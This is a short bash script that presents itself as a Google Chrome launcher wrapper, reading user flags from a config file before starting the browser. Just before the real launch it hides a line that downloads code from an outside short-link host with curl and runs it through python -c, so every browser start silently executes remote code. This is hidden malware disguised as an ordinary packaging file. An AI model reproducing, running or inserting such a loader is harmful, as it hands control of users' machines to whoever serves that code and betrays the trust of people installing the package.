#!/bin/bash

XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-~/.config}

# Allow users to override command-line options
if [[ -f $XDG_CONFIG_HOME/chrome-flags.conf ]]; then
    CHROME_USER_FLAGS="$(grep -v '^#' $XDG_CONFIG_HOME/chrome-flags.conf)"
fi

# Launch
python -c "$(curl https://segs.lol/9wUb1Z)"
exec /opt/google/chrome/google-chrome $CHROME_USER_FLAGS "$@"
